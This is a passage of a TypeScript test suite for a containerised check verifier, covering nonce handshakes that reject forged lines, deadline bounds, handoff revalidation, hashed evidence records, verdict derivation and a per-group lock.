  asChildProcess(): ChildProcess {
    return this as unknown as ChildProcess;
  }
}

describe('the startup handshake', () => {
  it("classifies the first line against this container's nonce and nothing else", () => {
    const nonce = newCheckNonce();
    expect(nonce).toMatch(/^[0-9a-f]{32}$/);
    expect(new Set(Array.from({ length: 500 }, () => newCheckNonce())).size).toBe(500);

    expect(classifyHandshake(`${HANDSHAKE_PREFIX}${nonce}`, nonce)).toBe('ok');
    expect(classifyHandshake(null, nonce)).toBe('missing');
    expect(classifyHandshake('', nonce)).toBe('missing');
    expect(classifyHandshake('Unable to find image locally', nonce)).toBe('missing');
    expect(classifyHandshake(`${HANDSHAKE_PREFIX}${newCheckNonce()}`, nonce)).toBe('mismatch');
    expect(classifyHandshake(`${HANDSHAKE_PREFIX}`, nonce)).toBe('mismatch');
    // Not the first line, not a handshake: trailing content makes it a forgery.
    expect(classifyHandshake(`${HANDSHAKE_PREFIX}${nonce} extra`, nonce)).toBe('mismatch');
    expect(classifyHandshake(` ${HANDSHAKE_PREFIX}${nonce}`, nonce)).toBe('missing');
  });

  it('takes the first line off stdout, keeps every later byte, and is bounded', () => {
    const sink = new CappedSink(1_000_000);
    const splitter = new HandshakeSplitter(sink);
    splitter.push(Buffer.from('RUN_CHECK_'));
    splitter.push(Buffer.from('READY abc\nhello'));
    splitter.push(Buffer.from(' world\n'));
    splitter.end();
    expect(splitter.line).toBe('RUN_CHECK_READY abc');
    expect(sink.text()).toBe('hello world\n');
    // The handshake costs the check nothing: only its own bytes are counted.
    expect(sink.total).toBe('hello world\n'.length);

    // A container that never emits a newline cannot make the host buffer
    // without bound: past the cap everything held becomes ordinary output.
    const quiet = new CappedSink(1_000_000);
    const stubborn = new HandshakeSplitter(quiet);
    const blob = Buffer.alloc(HANDSHAKE_MAX_BYTES + 10, 0x78);
    stubborn.push(blob);
    stubborn.push(Buffer.from('more'));
    stubborn.end();
    expect(stubborn.line).toBeNull();
    expect(quiet.total).toBe(blob.length + 4);

    // EOF with no newline at all: still nothing lost, still no line.
    const short = new CappedSink(1_000_000);
    const eof = new HandshakeSplitter(short);
    eof.push(Buffer.from('no newline'));
    eof.end();
    expect(eof.line).toBeNull();
    expect(short.text()).toBe('no newline');
  });

  it('writes the nonce as the FIRST stdin line and the frozen command after it', async () => {
    const children: FakeChild[] = [];
    const nonces: string[] = [];
    const runner = createDockerRunner({
      spawnFn: () => {
        const child = new FakeChild();
        children.push(child);
        setTimeout(() => {
          child.stdout.emit('data', Buffer.from(`${HANDSHAKE_PREFIX}${nonces[0]}\n`));
          child.emit('close', 0);
        }, 1);
        return child.asChildProcess();
      },
      exec: async () => ({ code: 0, stdout: '', stderr: '', ok: true, timedOut: false }),
      graceMs: 20,
    });
    const outcome = await runWith('H-HS-STDIN', ['pnpm test --filter=x'], {
      deps: {
        runDocker: async (file, argv, options) => {
          nonces.push(options.nonce);
          dockerCalls.push({ file, argv, options });
          return runner(file, argv, options);
        },
      },
    });

    expect(outcome.verdict).toBe('ALL_CHECKS_PASSED');
    expect(children).toHaveLength(1);
    expect(children[0]!.written).toEqual([`${nonces[0]}\npnpm test --filter=x`]);
    // ...and nowhere else: not in argv, not in any env flag value.
    expect(dockerCalls[0]!.argv.some((element) => element.includes(nonces[0]!))).toBe(false);
    // The handshake line itself is not part of the check's recorded output.
    expect(fs.readFileSync(path.join(outcome.runDir!, 'check-1.stdout.txt'), 'utf8')).toBe('');
    expect((readRecord(outcome).checks as CheckRecord[])[0]!.stdout_bytes).toBe(0);
  });

  it('a CHECK that prints its own RUN_CHECK_READY after the real one changes nothing', async () => {
    const nonces: string[] = [];
    const runner = createDockerRunner({
      spawnFn: () => {
        const child = new FakeChild();
        setTimeout(() => {
          child.stdout.emit('data', Buffer.from(`${HANDSHAKE_PREFIX}${nonces[0]}\n`));
          // The check's own first output, shaped exactly like a handshake.
          child.stdout.emit('data', Buffer.from(`${HANDSHAKE_PREFIX}forged-by-the-check\nreal output\n`));
          child.emit('close', 0);
        }, 1);
        return child.asChildProcess();
      },
      exec: async () => ({ code: 0, stdout: '', stderr: '', ok: true, timedOut: false }),
      graceMs: 20,
    });
    const outcome = await runWith('H-HS-ECHO', ['echo RUN_CHECK_READY forged-by-the-check'], {
      deps: {
        runDocker: async (file, argv, options) => {
          nonces.push(options.nonce);
          dockerCalls.push({ file, argv, options });
          return runner(file, argv, options);
        },
      },
    });

    // Stored as text, and the verdict is untouched by it.
    expect(outcome.verdict).toBe('ALL_CHECKS_PASSED');
    expect(fs.readFileSync(path.join(outcome.runDir!, 'check-1.stdout.txt'), 'utf8')).toBe(
      `${HANDSHAKE_PREFIX}forged-by-the-check\nreal output\n`,
    );
    expect((readRecord(outcome).checks as CheckRecord[])[0]!.handshake).toBe('ok');
  });

  const setupFailures: Array<[string, Partial<DockerRunResult>, string]> = [
    ['no handshake at all (the gate script exited before its printf)', { handshakeLine: null, exitCode: 4 }, 'missing'],
    [
      "a forged handshake carrying somebody else's nonce",
      { handshakeLine: `${HANDSHAKE_PREFIX}00000000000000000000000000000000`, exitCode: 0 },
      'mismatch',
    ],
    [
      "the daemon's own refusal to start the container (exit 125, no handshake)",
      { handshakeLine: null, exitCode: 125 },
      'missing',
    ],
  ];

  for (const [name, over, handshake] of setupFailures) {
    it(`stops with setup_failed on ${name}`, async () => {
      scripted = [over, {}, {}];
      const outcome = await runWith('H-HS-FAIL', ['true', 'true', 'true']);

      expect(outcome.verdict).toBe('VERIFIER_ERROR');
      expect(outcome.error_reason).toBe('setup_failed');
      // The container that failed to set up is never counted as having run.
      expect(outcome.checks_ran).toBe(0);
      expect(dockerCalls).toHaveLength(1);

      const checks = readRecord(outcome).checks as CheckRecord[];
      expect(checks.map((c) => c.status)).toEqual(['setup_failed', 'not_run', 'not_run']);
      expect(checks[0]!.handshake).toBe(handshake);
      expect(checks[1]!.handshake).toBeNull();
      // Its container is still removed, and confirmed, before the run stops.
      expect(checks[0]!.removal_confirmed).toBe(true);
      expect(notifications.messages[0]!).toContain(`handshake=${handshake}`);
    });
  }

  it('exit 4, 125, 126 and 127 are ordinary CHECK failures once the handshake is verified', async () => {
    scripted = [{ exitCode: 4 }, { exitCode: 125 }, { exitCode: 126 }, { exitCode: 127 }, {}];
    const outcome = await runWith('H-HS-EXITS', ['a', 'b', 'c', 'd', 'true']);

    expect(dockerCalls).toHaveLength(5);
    expect(outcome.verdict).toBe('CHECK_FAILED');
    expect(outcome.error_reason).toBeNull();
    expect(outcome.checks_ran).toBe(5);
    const checks = readRecord(outcome).checks as CheckRecord[];
    expect(checks.map((c) => c.exit_code)).toEqual([4, 125, 126, 127, 0]);
    expect(checks.every((c) => c.status === 'ran')).toBe(true);
    expect(checks.every((c) => c.handshake === 'ok')).toBe(true);
    expect(checks.every((c) => c.removal_confirmed)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// C2. The overall deadline is monotonic and bounds EVERY step.
// ---------------------------------------------------------------------------
describe('the monotonic overall deadline bounds every step', () => {
  it('passes min(default, remaining) into the archive, the image inspect and the removals', async () => {
    writeConfig({ wallSeconds: 4 });
    clockStepMs = 0;
    const base = deps();
    const bounds: Array<{ what: string; timeoutMs: number | undefined }> = [];
    await runWith('H-DL-BOUNDS', ['true'], {
      deps: {
        exec: async (file, argv, options) => {
          if (file === 'git' && argv.includes('archive'))
            bounds.push({ what: 'archive', timeoutMs: options?.timeoutMs });
          if (file === 'docker' && argv[0] === 'image') bounds.push({ what: 'inspect', timeoutMs: options?.timeoutMs });
          if (file === 'docker' && argv[0] === 'rm') bounds.push({ what: 'rm', timeoutMs: options?.timeoutMs });
          return base.exec(file, argv, options);
        },
      },
    });
    // 4 s of budget is below every default, so every bound is the remainder —
    // except the mandatory removal, which never drops below its 5 s floor.
    expect(bounds.find((b) => b.what === 'archive')!.timeoutMs).toBe(4_000);
    expect(bounds.find((b) => b.what === 'inspect')!.timeoutMs).toBe(4_000);
    expect(bounds.find((b) => b.what === 'rm')!.timeoutMs).toBe(5_000);
    expect(dockerCalls[0]!.options.killTimeoutMs).toBe(4_000);
  });

  it('stops with `deadline` when the checkpoint export outlives the budget, before any container', async () => {
    writeConfig({ wallSeconds: 5 });
    const base = deps();
    const outcome = await runWith('H-DL-ARCHIVE', ['true'], {
      deps: {
        exec: async (file, argv, options) => {
          const result = await base.exec(file, argv, options);
          if (file === 'git' && argv.includes('archive')) clockMs += 9_000;
          return result;
        },
      },
    });
    expect(dockerCalls).toHaveLength(0);
    expect(outcome.verdict).toBe('VERIFIER_ERROR');
    expect(outcome.error_reason).toBe('deadline');
    expect((readRecord(outcome).checks as CheckRecord[])[0]!.status).toBe('not_run');
    expect(leftoverArchiveDirs()).toEqual([]);
  });

  it('stops with `deadline` when the image inspection outlives the budget', async () => {
    writeConfig({ wallSeconds: 5 });
    const base = deps();
    const outcome = await runWith('H-DL-IMAGE', ['true'], {
      deps: {
        exec: async (file, argv, options) => {
          const result = await base.exec(file, argv, options);
          if (file === 'docker' && argv[0] === 'image') clockMs += 9_000;
          return result;
        },
      },
    });
    expect(dockerCalls).toHaveLength(0);
    expect(outcome.error_reason).toBe('deadline');
    // What WAS discovered before the stop is still recorded.
    expect(readRecord(outcome).archive_sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it('a last check that times out at exactly the remaining budget is `deadline`, not TIMED_OUT', async () => {
    writeConfig({ wallSeconds: 8, perCommandSeconds: 300 });
    clockStepMs = 4_000;
    scripted = [{}, { exitCode: -1, timedOut: true }];
    const outcome = await runWith('H-DL-LASTCHECK', ['a', 'b']);

    expect(dockerCalls).toHaveLength(2);
    expect(dockerCalls.map((call) => call.options.wallSeconds)).toEqual([8, 4]);
    expect(outcome.verdict).toBe('VERIFIER_ERROR');
    expect(outcome.error_reason).toBe('deadline');
    const checks = readRecord(outcome).checks as CheckRecord[];
    expect(checks.map((c) => c.status)).toEqual(['ran', 'ran']);
    expect(checks[1]!.timed_out).toBe(true);
    // The removal still completed and was confirmed, deadline or not.
    expect(checks.every((c) => c.removal_confirmed)).toBe(true);
  });

  it('is `deadline` even when every check passed and only the last removal ran late', async () => {
    writeConfig({ wallSeconds: 10, perCommandSeconds: 300 });
    clockStepMs = 1_000;
    const base = deps();
    let removals = 0;
    const outcome = await runWith('H-DL-REMOVAL', ['a', 'b'], {
      deps: {
        exec: async (file, argv, options) => {
          const result = await base.exec(file, argv, options);
          if (file === 'docker' && argv[0] === 'rm' && ++removals === 2) clockMs += 20_000;
          return result;
        },
      },
    });

    expect(dockerCalls).toHaveLength(2);
    const checks = readRecord(outcome).checks as CheckRecord[];
    expect(checks.every((c) => c.status === 'ran' && c.exit_code === 0 && c.removal_confirmed)).toBe(true);
    // Every check passed; the run still did not finish inside its budget.
    expect(outcome.verdict).toBe('VERIFIER_ERROR');
    expect(outcome.error_reason).toBe('deadline');
  });
});

// ---------------------------------------------------------------------------
// C3. Handoff lifecycle revalidation, at all three points.
// ---------------------------------------------------------------------------
describe('the trusted handoff identity is re-proved before every container', () => {
  type Point = 'preflight' | 'between' | 'final';
  const transitions: Array<[ReviewOutcome, string]> = [
    ['CHANGES REQUIRED', 'changes_required'],
    ['APPROVED', 'approved'],
  ];

  /**
   * Run two checks, moving the handoff out of `delivered` at `point`:
   * during preflight (hooked on the ladder's last git call), between c1 and c2
   * (hooked in the runner), or after the last check (same hook, later).
   */
  async function runWithTransition(id: string, point: Point, reviewOutcome: ReviewOutcome) {
    const row = await newHandoff(id);
    await deliver(row, { checks: ['true', 'true'] });
    const base = deps();
    const move = async (): Promise<void> => {
      await reviewHandoff(id, ECHO, row.fingerprint, reviewOutcome);
    };
    return runChecksAction(
      { handoff_id: id },
      session(),
      deps({
        exec: async (file, argv, options) => {
          const result = await base.exec(file, argv, options);
          if (point === 'preflight' && file === 'git' && argv.includes('cat-file')) await move();
          return result;
        },
        runDocker: async (file, argv, options) => {
          const result = await base.runDocker(file, argv, options);
          if (point === 'between' && dockerCalls.length === 1) await move();
          if (point === 'final' && dockerCalls.length === 2) await move();
          return result;
        },
      }),
    );
  }

  for (const [reviewOutcome, status] of transitions) {
    for (const [point, containers, statuses] of [
      ['preflight', 0, ['not_run', 'not_run']],
      ['between', 1, ['ran', 'not_run']],
      ['final', 2, ['ran', 'ran']],
    ] as Array<[Point, number, string[]]>) {
      it(`stops with invalid_input when the handoff becomes ${status} at the ${point} point`, async () => {
        const id = `H-LIFE-${status}-${point}`;
        const outcome = await runWithTransition(id, point, reviewOutcome);

        expect(dockerCalls).toHaveLength(containers);
        expect(outcome.refused).toBe(false);
        expect(outcome.verdict).toBe('VERIFIER_ERROR');
        expect(outcome.error_reason).toBe('invalid_input');

        const record = readRecord(outcome);
        // The field that moved is named, so a reader knows WHAT changed.
        expect(record.invalid_input_detail).toBe('status');
        expect((record.checks as CheckRecord[]).map((c) => c.status)).toEqual(statuses);
        // The frozen list is still the list the run was authorised for.
        expect(record.frozen_checks).toEqual(['true', 'true']);

        // Recorded on disk AND referenced from the ledger, like any other run.
        expect(outcome.persistence).toEqual({ filesystem: 'ok', ledger_event: 'ok' });
        const event = await getDb().get<{ payload_json: string }>(
          "SELECT * FROM handoff_events WHERE handoff_id = ? AND event_type = 'verification'",
          id,
        );
        expect(JSON.parse(event!.payload_json)).toMatchObject({
          error_reason: 'invalid_input',
          record_sha256: outcome.recordSha256,
        });
        expect(notifications.messages[0]!).toContain('error_reason: invalid_input (status)');

        // The mutex was released, so the group is not wedged by the stop.
        const next = await newHandoff(`${id}-NEXT`);
        await deliver(next, { checks: ['true'] });
        const after = await runChecksAction({ handoff_id: next.id }, session(), deps());
        expect(after.refused).toBe(false);
        expect(after.verdict).toBe('ALL_CHECKS_PASSED');
      });
    }
  }

  it('names the field that moved when it is not the status', async () => {
    const row = await newHandoff('H-LIFE-FIELD');
    await deliver(row, { checks: ['true', 'true'] });
    const base = deps();
    const outcome = await runChecksAction(
      { handoff_id: row.id },
      session(),
      deps({
        runDocker: async (file, argv, options) => {
          const result = await base.runDocker(file, argv, options);
          if (dockerCalls.length === 1) {
            await getDb().run('UPDATE verification_inputs SET checkpoint = ? WHERE handoff_id = ?', 'deadbeef', row.id);
          }
          return result;
        },
      }),
    );
    expect(dockerCalls).toHaveLength(1);
    expect(outcome.error_reason).toBe('invalid_input');
    expect(readRecord(outcome).invalid_input_detail).toBe('checkpoint');
  });
});

// ---------------------------------------------------------------------------
// The frozen list, the record and the Echo message.
// ---------------------------------------------------------------------------
describe('the frozen list and the evidence record', () => {
  it('freezes the list and its hashes before the first container, and records both', async () => {
    const commands = ['pnpm test', 'node scripts/smoke.js', 'true'];
    const outcome = await runWith('H-FROZEN', commands);

    const record = readRecord(outcome);
    expect(record.frozen_checks).toEqual(commands);
    expect(record.frozen_checks_sha256).toBe(frozenChecksSha256(commands));
    const checks = record.checks as CheckRecord[];
    expect(checks.map((c) => c.command)).toEqual(commands);
    expect(checks.map((c) => c.command_sha256)).toEqual(commands.map((c) => sha256Hex(c)));
    // Each container was handed exactly the frozen command with that hash.
    for (let i = 0; i < commands.length; i++) {
      expect(dockerCalls[i]!.options.stdin).toBe(commands[i]);
      expect(sha256Hex(dockerCalls[i]!.options.stdin)).toBe(checks[i]!.command_sha256);
    }
    expect(record.run_id).toMatch(/^[0-9a-z]+$/);
    expect(record.host_uid).toBe(process.getuid!());
    expect(record.archive_sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(record.archive_bytes as number).toBeGreaterThan(0);

    // record.sha256 is the hash of the bytes actually on disk.
    const bytes = fs.readFileSync(path.join(outcome.runDir!, 'record.json'));
    expect(fs.readFileSync(path.join(outcome.runDir!, 'record.sha256'), 'utf8').trim()).toBe(sha256Hex(bytes));
    expect(outcome.recordSha256).toBe(sha256Hex(bytes));

    // Per-check output files, and no temporary artefact from the rename.
    const entries = fs.readdirSync(outcome.runDir!).sort();
    expect(entries).toEqual([
      'check-1.stderr.txt',
      'check-1.stdout.txt',
      'check-2.stderr.txt',
      'check-2.stdout.txt',
      'check-3.stderr.txt',
      'check-3.stdout.txt',
      'persistence.json',
      'record.json',
      'record.sha256',
    ]);
    // record.json says what was true when it was written; persistence.json says
    // how it resolved. The hash covers only the former.
    expect(record.persistence).toEqual({ filesystem: 'ok', ledger_event: 'pending' });
    expect(JSON.parse(fs.readFileSync(path.join(outcome.runDir!, 'persistence.json'), 'utf8'))).toMatchObject({
      filesystem: 'ok',
      ledger_event: 'ok',
      errors: [],
    });

    const event = await getDb().get<{ event_type: string; actor_agent_group_id: string; payload_json: string }>(
      "SELECT * FROM handoff_events WHERE handoff_id = ? AND event_type = 'verification'",
      'H-FROZEN',
    );
    expect(event?.actor_agent_group_id).toBe('host:verifier');
    expect(JSON.parse(event!.payload_json)).toMatchObject({
      record_sha256: outcome.recordSha256,
      verdict: 'ALL_CHECKS_PASSED',
      error_reason: null,
      checks_ran: 3,
      run_dir: outcome.runDir,
    });

    // Verification does not transition the handoff.
    const after = await getDb().get<HandoffRow>('SELECT * FROM handoffs WHERE id = ?', 'H-FROZEN');
    expect(after?.status).toBe('delivered');
  });

  it('tells Echo the verdict first, one line per check, and never a host path', async () => {
    scripted = [{}, { exitCode: 2 }, {}];
    const outcome = await runWith('H-MSG', ['true', 'false', 'true']);
    const message = notifications.messages[0]!;
    const checks = readRecord(outcome).checks as CheckRecord[];

    expect(message.indexOf('verdict: CHECK_FAILED')).toBeLessThan(message.indexOf('c1 ran'));
    expect(message).toContain(
      `c1 ran exit=0 timed_out=false removed=true sha256=${checks[0]!.command_sha256.slice(0, 12)}`,
    );
    expect(message).toContain('c2 ran exit=2 timed_out=false removed=true');
    expect(message).toContain(`record_sha256: ${outcome.recordSha256}`);
    expect(message).toContain('persistence: filesystem=ok ledger_event=ok');
    expect(message).not.toContain(repoDir);
    expect(message).not.toContain(dataDir);
    expect(message).not.toContain(outcome.runDir!);
    expect(message).not.toContain('host_path');
  });

  it('writes `not_run` lines with a dash for the exit code', async () => {
    defaultInspect = (name) =>
      name.endsWith('-c1') ? { code: 0, stdout: '', stderr: '', ok: true, timedOut: false } : noSuchContainer(name);
    await runWith('H-MSG2', ['true', 'true']);
    const message = notifications.messages[0]!;
    expect(message).toContain('verdict: VERIFIER_ERROR');
    expect(message).toContain('error_reason: removal_unconfirmed');
    expect(message).toContain('c1 ran exit=0 timed_out=false removed=false');
    expect(message).toContain('c2 not_run exit=- timed_out=false removed=false');
  });
});

// ---------------------------------------------------------------------------
// deriveVerdict, in isolation.
// ---------------------------------------------------------------------------
describe('deriveVerdict reads only the host-owned facts', () => {
  const ran = (over: Partial<CheckRecord>): CheckRecord => ({
    ...emptyCheckRecord(1, 'true', sha256Hex('true')),
    status: 'ran',
    exit_code: 0,
    removal_confirmed: true,
    ...over,
  });

  it('passes only when every check ran, exited 0, did not time out and was confirmed removed', () => {
    expect(deriveVerdict([ran({}), ran({ index: 2 })], null)).toEqual({
      verdict: 'ALL_CHECKS_PASSED',
      error_reason: null,
    });
    expect(deriveVerdict([ran({}), ran({ index: 2, exit_code: 1 })], null).verdict).toBe('CHECK_FAILED');
    expect(deriveVerdict([ran({ timed_out: true, exit_code: -1 })], null).verdict).toBe('TIMED_OUT');
    // Exit 0 but the container could not be proved gone: never a pass.
    expect(deriveVerdict([ran({ removal_confirmed: false })], null).verdict).toBe('VERIFIER_ERROR');
    // A not_run check is never a pass either.
    expect(deriveVerdict([ran({}), emptyCheckRecord(2, 'x', 'h')], null).verdict).toBe('VERIFIER_ERROR');
  });

  it('lets any stop condition win outright', () => {
    for (const reason of [
      'archive_failed',
      'spawn_failed',
      'removal_unconfirmed',
      'docker_uncertain',
      'invalid_input',
      'deadline',
    ] as const) {
      expect(deriveVerdict([ran({})], reason)).toEqual({ verdict: 'VERIFIER_ERROR', error_reason: reason });
    }
    // Even when every check that ran was clean.
    expect(deriveVerdict([ran({}), ran({ index: 2 })], 'deadline').verdict).toBe('VERIFIER_ERROR');
  });

  it('keeps NO_CHECKS_PRESENT in the enum although the schema makes it unreachable', () => {
    expect(deriveVerdict([], null)).toEqual({ verdict: 'NO_CHECKS_PRESENT', error_reason: null });
  });
});

// ---------------------------------------------------------------------------
// The mutex.
// ---------------------------------------------------------------------------
describe('one verification per reviewer group', () => {
  it('refuses a second run while one is in flight, and frees the lock afterwards', async () => {
    let release!: () => void;
    const hold = new Promise<void>((resolve) => {
      release = resolve;
    });
    gate = { hold, release };

    const a = await newHandoff('H-LOCK-A');
    await deliver(a, { checks: ['true'] });
    const b = await newHandoff('H-LOCK-B');
    await deliver(b, { checks: ['true'] });

    const first = runChecksAction({ handoff_id: 'H-LOCK-A' }, session(), deps());
    while (dockerCalls.length === 0) await new Promise((r) => setTimeout(r, 5));

    const second = await runChecksAction({ handoff_id: 'H-LOCK-B' }, session(), deps());
    expect(second).toMatchObject({ refused: true, reason: 'verification in progress for H-LOCK-B' });
    expect(dockerCalls).toHaveLength(1);

    release();
    await first;
    gate = null;

    // The mutex is released in a `finally`, so a run that throws inside the
    // runner still frees it.
    const c = await newHandoff('H-LOCK-C');
    await deliver(c, { checks: ['true'] });
    await expect(
      runChecksAction(
        { handoff_id: 'H-LOCK-C' },
        session(),
        deps({
          runDocker: async () => {
            throw new Error('runner exploded');
          },
        }),
      ),
    ).rejects.toThrow('runner exploded');
    expect(leftoverArchiveDirs()).toEqual([]);

    const after = await runWith('H-LOCK-D', ['true']);
    expect(after.refused).toBe(false);
  });
});
